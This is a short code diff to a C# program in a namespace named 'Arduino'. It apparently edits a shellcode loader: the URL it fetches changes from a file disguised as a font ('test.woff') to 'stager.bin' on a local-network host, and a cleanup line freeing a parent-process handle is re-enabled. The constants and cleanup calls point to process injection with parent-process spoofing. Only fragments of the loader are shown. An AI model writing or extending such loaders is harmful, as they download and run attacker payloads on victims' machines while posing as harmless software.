@@ -7,7 +7,7 @@ namespace Arduino
 {
     public class Program
     {
-        private static string url = "http://192.168.1.126:8000/test.woff";
+        private static string url = "http://192.168.1.126:8000/stager.bin";
         #region Constants
         const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
         const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
@@ -278,7 +278,7 @@ namespace Arduino
             // Cleanup
             DeleteProcThreadAttributeList(lpAttributeList);
             Marshal.FreeHGlobal(lpAttributeList);
-            //Marshal.FreeHGlobal(pParentHandle);
+            Marshal.FreeHGlobal(pParentHandle);
             Marshal.FreeHGlobal(pContext);
             CloseHandle(hParentProcess);
             CloseHandle(pi.hThread);
